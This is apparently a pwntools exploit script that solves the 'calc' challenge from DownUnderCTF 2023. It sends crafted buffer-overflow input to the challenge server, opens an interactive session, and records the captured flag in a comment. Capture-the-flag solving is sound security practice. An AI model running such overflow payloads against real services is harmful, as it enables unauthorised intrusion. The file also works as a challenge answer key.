#!/usr/bin/env python3
from pwn import *

context.encoding = "latin"
context.log_level = "CRITICAL"
context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF("./calc")
libc = elf.libc
# libc = ELF("./libc.so.6")

gdbscript = """
b *calculate+110
c
"""

p = remote("2023.ductf.dev", 30015)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript)

p.sendline(b'2')
p.sendline(b"A"*36 + b"7!_;" + b'AAAA' + b'A>-~')

p.sendline(b'2')
p.sendline(b"A"*36 + b"7!_;" + b'AAAA')

p.sendline(b'1')

p.interactive()
# DUCTF{d1d_y0u_p0p_c4lc?}